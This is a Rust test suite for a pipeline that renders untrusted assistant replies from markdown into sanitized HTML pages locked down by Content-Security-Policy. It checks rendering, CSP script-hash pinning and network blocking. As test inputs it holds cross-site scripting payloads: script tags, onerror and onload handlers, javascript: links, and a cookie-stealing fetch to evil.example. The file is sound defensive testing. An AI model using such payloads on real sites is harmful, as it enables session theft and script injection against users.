//! Spec for the shared markdown → sanitized HTML → CSP-locked page pipeline.
//!
//! The threat model (gtk#25): assistant replies are untrusted. Anything that
//! reaches an embedded HTML engine must be inert, and the page it lands in must
//! refuse to run script it did not ship itself.

use adele_markdown::{bubble, chat_page, markdown_to_html};

/// Extract the value of a CSP directive from a full HTML document.
fn csp_directive(html: &str, directive: &str) -> String {
    let csp_start = html
        .find("Content-Security-Policy")
        .expect("document has a CSP meta tag");
    let after = &html[csp_start..];
    let content_start =
        after.find("content=\"").expect("CSP has a content attr") + "content=\"".len();
    let content_end = content_start
        + after[content_start..]
            .find('"')
            .expect("CSP content attr closes");
    after[content_start..content_end]
        .split(';')
        .map(str::trim)
        .find(|d| d.starts_with(directive))
        .unwrap_or_else(|| {
            panic!(
                "CSP defines {directive}; got {:?}",
                &after[content_start..content_end]
            )
        })
        .to_string()
}

/// Extract the body of the single inline `<script>` element.
fn inline_script_body(html: &str) -> &str {
    let open = html
        .find("<script>")
        .expect("document has an inline script");
    let start = open + "<script>".len();
    let end = start
        + html[start..]
            .find("</script>")
            .expect("inline script closes");
    &html[start..end]
}

/// Recompute the CSP source expression for a script body.
fn sha256_source(body: &str) -> String {
    use base64::Engine as _;
    use sha2::{Digest, Sha256};
    format!(
        "'sha256-{}'",
        base64::engine::general_purpose::STANDARD.encode(Sha256::digest(body.as_bytes()))
    )
}

// --- markdown_to_html: the rendering contract -------------------------------

#[test]
fn renders_inline_emphasis_and_code() {
    let html = markdown_to_html("**bold** and *italic* and `code`");
    assert!(html.contains("<strong>bold</strong>"), "{html}");
    assert!(html.contains("<em>italic</em>"), "{html}");
    assert!(html.contains("<code>code</code>"), "{html}");
}

#[test]
fn renders_fenced_code_blocks() {
    let html = markdown_to_html("```rust\nfn main() {}\n```");
    assert!(html.contains("<pre>"), "{html}");
    assert!(html.contains("<code"), "{html}");
    assert!(html.contains("fn main()"), "{html}");
}

#[test]
fn renders_gfm_tables() {
    let md = "| a | b |\n|---|---|\n| 1 | 2 |";
    let html = markdown_to_html(md);
    assert!(html.contains("<table>"), "{html}");
    assert!(html.contains("<th>a</th>"), "{html}");
    assert!(html.contains("<td>1</td>"), "{html}");
}

#[test]
fn renders_strikethrough() {
    let html = markdown_to_html("~~gone~~");
    assert!(html.contains("<del>gone</del>"), "{html}");
}

#[test]
fn renders_task_lists() {
    let html = markdown_to_html("- [ ] todo\n- [x] done");
    assert!(html.contains("<ul>"), "{html}");
    assert!(html.contains("todo") && html.contains("done"), "{html}");
}

#[test]
fn renders_nested_lists_and_blockquotes() {
    let md = "1. outer\n   - inner a\n   - inner b\n\n> quoted";
    let html = markdown_to_html(md);
    assert!(html.contains("<ol>"), "{html}");
    assert!(html.contains("<ul>"), "{html}");
    assert!(html.contains("inner a"), "{html}");
    assert!(html.contains("<blockquote>"), "{html}");
}

#[test]
fn renders_headings_and_safe_links() {
    let html = markdown_to_html("# Heading\n\n[link](https://example.com)");
    assert!(html.contains("<h1>Heading</h1>"), "{html}");
    assert!(html.contains(r#"href="https://example.com""#), "{html}");
    assert!(html.contains(">link</a>"), "{html}");
}

// --- markdown_to_html: the security contract --------------------------------

#[test]
fn strips_raw_script_tag_but_keeps_adjacent_text() {
    let html = markdown_to_html("<script>alert(1)</script>hello");
    assert!(html.contains("hello"), "adjacent text must survive: {html}");
    assert!(!html.to_ascii_lowercase().contains("<script"), "{html}");
    assert!(!html.contains("alert(1)"), "{html}");
}

#[test]
fn strips_img_onerror_handler() {
    let html = markdown_to_html("before <img src=x onerror=\"alert(1)\"> after");
    assert!(html.contains("before") && html.contains("after"), "{html}");
    assert!(!html.to_ascii_lowercase().contains("onerror"), "{html}");
    assert!(!html.to_ascii_lowercase().contains("alert(1)"), "{html}");
}

#[test]
fn strips_javascript_uri_from_markdown_link() {
    let html = markdown_to_html("[x](javascript:alert(1))");
    assert!(!html.to_ascii_lowercase().contains("javascript:"), "{html}");
    assert!(html.contains('x'), "link text survives: {html}");
}

#[test]
fn strips_javascript_uri_from_raw_anchor() {
    let html =
        markdown_to_html("click <a href=\"javascript:alert(1)\" onclick=\"alert(2)\">me</a> now");
    let lower = html.to_ascii_lowercase();
    assert!(!lower.contains("javascript:"), "{html}");
    assert!(!lower.contains("onclick"), "{html}");
    assert!(
        html.contains("click") && html.contains("me") && html.contains("now"),
        "{html}"
    );
}

#[test]
fn strips_iframe_object_and_style_elements() {
    let html = markdown_to_html(
        "<iframe src=\"https://evil.example\"></iframe>\n\n\
         <object data=\"x\"></object>\n\n\
         <style>body{background:url(https://evil.example)}</style>\n\nkeep",
    );
    let lower = html.to_ascii_lowercase();
    for bad in ["<iframe", "<object", "<style", "evil.example"] {
        assert!(!lower.contains(bad), "{bad} must be stripped: {html}");
    }
    assert!(html.contains("keep"), "{html}");
}

#[test]
fn strips_form_and_input_controls() {
    let html =
        markdown_to_html("<form action=\"https://evil.example\"><input name=\"pw\"></form>ok");
    let lower = html.to_ascii_lowercase();
    assert!(!lower.contains("<form"), "{html}");
    assert!(!lower.contains("evil.example"), "{html}");
    assert!(html.contains("ok"), "{html}");
}

// --- chat_page: GTK's whole-transcript document -----------------------------

#[test]
fn chat_page_is_a_complete_document() {
    let t = chat_page::html_template();
    assert!(t.contains("<!DOCTYPE html>"), "{t}");
    assert!(t.contains("updateMessages"), "{t}");
    assert!(t.contains("#messages"), "{t}");
}

#[test]
fn chat_page_csp_pins_script_hash_and_forbids_inline() {
    let t = chat_page::html_template();
    assert!(csp_directive(t, "default-src").contains("'none'"));
    let script_src = csp_directive(t, "script-src");
    assert!(!script_src.contains("'unsafe-inline'"), "{script_src}");
    assert!(!script_src.contains("'unsafe-eval'"), "{script_src}");
    assert!(script_src.contains("'sha256-"), "{script_src}");
}

#[test]
fn chat_page_csp_hash_matches_its_inline_script() {
    let t = chat_page::html_template();
    let expected = sha256_source(inline_script_body(t));
    assert!(
        t.contains(&expected),
        "CSP must pin {expected}, the hash of the script it actually ships"
    );
}

// --- bubble: macOS's per-message document -----------------------------------

#[test]
fn bubble_document_embeds_the_rendered_markdown() {
    let doc = bubble::document("# Hi\n\n| a |\n|---|\n| 1 |");
    assert!(doc.contains("<!DOCTYPE html>"), "{doc}");
    assert!(doc.contains("<h1>Hi</h1>"), "{doc}");
    assert!(doc.contains("<table>"), "{doc}");
}

#[test]
fn bubble_document_csp_pins_script_hash_and_forbids_inline() {
    let doc = bubble::document("hi");
    assert!(csp_directive(&doc, "default-src").contains("'none'"));
    let script_src = csp_directive(&doc, "script-src");
    assert!(!script_src.contains("'unsafe-inline'"), "{script_src}");
    assert!(!script_src.contains("'unsafe-eval'"), "{script_src}");
    assert!(script_src.contains("'sha256-"), "{script_src}");
}

#[test]
fn bubble_document_csp_hash_matches_its_inline_script() {
    let doc = bubble::document("hi");
    let expected = sha256_source(inline_script_body(&doc));
    assert!(doc.contains(&expected), "CSP must pin {expected}");
}

#[test]
fn bubble_document_hash_is_stable_across_content() {
    // The host loads the document once and then patches content in place, so
    // the pinned hash must not depend on the message body.
    let a = bubble::document("hello");
    let b = bubble::document("| a |\n|---|\n| 1 |");
    assert_eq!(inline_script_body(&a), inline_script_body(&b));
}

#[test]
fn bubble_document_blocks_the_network() {
    let doc = bubble::document("![x](https://evil.example/track.png)");
    // No remote origin is reachable: default-src 'none' with an img-src that
    // only permits inline data URIs, and no connect-src escape hatch.
    assert!(csp_directive(&doc, "default-src").contains("'none'"));
    let img_src = csp_directive(&doc, "img-src");
    assert!(img_src.contains("data:"), "{img_src}");
    assert!(
        !img_src.contains("http"),
        "remote images must not load: {img_src}"
    );
}

#[test]
fn bubble_document_ships_no_remote_references() {
    // Belt-and-suspenders with the CSP: the template itself must not fetch
    // anything (no CDN fonts, stylesheets, or scripts).
    let doc = bubble::document("hi");
    let head_end = doc.find("</head>").expect("document has a head");
    let head = &doc[..head_end];
    assert!(!head.contains("http://"), "{head}");
    assert!(!head.contains("https://"), "{head}");
    assert!(!head.contains("<link"), "{head}");
}

#[test]
fn bubble_document_exposes_the_in_place_update_hook() {
    let doc = bubble::document("hi");
    assert!(doc.contains(bubble::SET_CONTENT_FUNCTION), "{doc}");
    assert!(doc.contains("id=\"content\""), "{doc}");
}

#[test]
fn bubble_document_reports_its_height_to_the_host() {
    let doc = bubble::document("hi");
    assert!(doc.contains("scrollHeight"), "{doc}");
    assert!(
        doc.contains(&format!(
            "messageHandlers.{}",
            bubble::HEIGHT_MESSAGE_HANDLER
        )),
        "{doc}"
    );
    assert!(
        doc.contains("ResizeObserver"),
        "reflow must re-report: {doc}"
    );
}

#[test]
fn bubble_document_follows_the_system_appearance() {
    let doc = bubble::document("hi");
    assert!(doc.contains("prefers-color-scheme: dark"), "{doc}");
    assert!(doc.contains("color-scheme: light dark"), "{doc}");
}

#[test]
fn bubble_document_has_a_transparent_background() {
    // The SwiftUI bubble draws the background; a painted page would show as a
    // rectangle inside the rounded bubble.
    let doc = bubble::document("hi");
    assert!(doc.contains("background: transparent"), "{doc}");
}

#[test]
fn bubble_document_neutralizes_a_hostile_reply_end_to_end() {
    let hostile = "Sure, here is a tip:\n\n\
                   <script>fetch('https://evil.example/'+document.cookie)</script>\n\n\
                   <img src=x onerror=\"alert('pwn')\">\n\n\
                   <iframe src=\"javascript:alert(1)\"></iframe>\n\n\
                   <a href=\"javascript:alert(1)\" onclick=\"alert(2)\">click</a>\n\n\
                   [also this](javascript:alert(3))\n\n\
                   <svg onload=\"alert(4)\"></svg>\n\n\
                   Bye!";
    let doc = bubble::document(hostile);
    let body_start = doc.find("<body>").expect("document has a body");
    let script_start = doc
        .find("<script>")
        .expect("document has its inline script");
    let body = &doc[body_start..script_start];

    assert!(body.contains("Sure, here is a tip"), "{body}");
    assert!(body.contains("Bye!"), "{body}");

    let lower = body.to_ascii_lowercase();
    for bad in [
        "<script",
        "onerror",
        "onclick",
        "onload",
        "javascript:",
        "<iframe",
        "<svg",
        "alert(",
        "evil.example",
    ] {
        assert!(
            !lower.contains(bad),
            "hostile token {bad:?} reached the page: {body}"
        );
    }
}
